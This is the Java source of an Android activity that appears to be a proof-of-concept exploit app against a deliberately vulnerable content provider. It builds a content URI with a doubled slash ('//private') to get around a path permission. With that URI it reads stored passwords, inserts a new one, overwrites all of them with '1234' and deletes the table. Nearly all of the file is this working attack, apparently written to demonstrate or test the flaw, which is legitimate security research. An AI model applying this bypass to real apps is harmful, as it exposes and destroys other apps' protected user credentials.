package dev.virtualpatch.contentproviderurivalidation;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    // added extra "/"
    private final String EXPLOIT_CONTENT_URI = "content://dev.virtualpatch.vulnerablecp//private";
    private final String CONTENT_URI = "content://dev.virtualpatch.vulnerablecp/private";
    private Button query, insert, update, delete, no_exploit;
    private TextView output;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        query = findViewById(R.id.query);
        insert = findViewById(R.id.insert);
        update = findViewById(R.id.update);
        delete = findViewById(R.id.delete);
        no_exploit = findViewById(R.id.test);
        output = findViewById(R.id.output);
    }

    @SuppressLint("Range")
    @Override
    protected void onStart() {
        super.onStart();
        query.setOnClickListener((view -> {
            try {
                show(EXPLOIT_CONTENT_URI);
            } catch(SecurityException e){
                output.setText(EXPLOIT_CONTENT_URI + "\n\nYou don't have the required permissions!!");
            }
        }));
        insert.setOnClickListener((view -> {
            try {
                insert(EXPLOIT_CONTENT_URI);
            } catch(SecurityException e){
                output.setText(EXPLOIT_CONTENT_URI + "\n\nYou don't have the required permissions!!");
            }
        }));
        update.setOnClickListener((view -> {
            try {
                update(EXPLOIT_CONTENT_URI);
            } catch(SecurityException e){
                output.setText(EXPLOIT_CONTENT_URI + "\n\nYou don't have the required permissions!!");
            }
        }));
        delete.setOnClickListener((view -> {
            try {
                delete(EXPLOIT_CONTENT_URI);
            } catch(SecurityException e){
                output.setText(EXPLOIT_CONTENT_URI + "\n\nYou don't have the required permissions!!");
            }
        }));
        no_exploit.setOnClickListener((view -> {
            try {
                show(CONTENT_URI);
            } catch(SecurityException e){
                output.setText(CONTENT_URI + "\n\nYou don't have the required permissions!!");
            }
        }));
    }

    @SuppressLint("Range")
    public void show(String content){
        StringBuilder strBuild = new StringBuilder();

        Cursor cursor = getContentResolver().query(Uri.parse(content), null, null, null, null);
        if (cursor.moveToFirst()) {
            strBuild.append(content + "\n");
            while (!cursor.isAfterLast()) {
                strBuild.append("\n" + cursor.getString(cursor.getColumnIndex("id")) + "-" + cursor.getString(cursor.getColumnIndex("password")));
                cursor.moveToNext();
            }
        } else {
            output.setText("No Records Found");
        }

        output.setText(strBuild);
    }

    public void insert(String content){
        StringBuilder strBuild = new StringBuilder();
        strBuild.append(content + "\n");
        strBuild.append("ADD NEW PASSWORD \"1337pwd\"\n\n");

        ContentValues values = new ContentValues();
        values.put("password", "1337pwd");

        getContentResolver().insert(Uri.parse(content), values);
        Toast.makeText(getBaseContext(), "New Record Inserted", Toast.LENGTH_LONG).show();
        output.setText(strBuild);
    }

    @SuppressLint("Range")
    public void update(String content){
        StringBuilder strBuild = new StringBuilder();
        strBuild.append(content + "\n");
        strBuild.append("\n\nMODIFY ALL PASSWORDS TO \"1234\"\n\n");

        ContentValues values = new ContentValues();
        values.put("password", "1234");

        getContentResolver().update(Uri.parse(content), values, null, null);
        output.setText(strBuild);
    }

    public void delete(String content){
        StringBuilder strBuild = new StringBuilder();
        strBuild.append(content + "\n");
        strBuild.append("\n\nDELETE ALL PASSWORDs\n\n");

        getContentResolver().delete(Uri.parse(content), null, null);
        output.setText(strBuild);
    }
}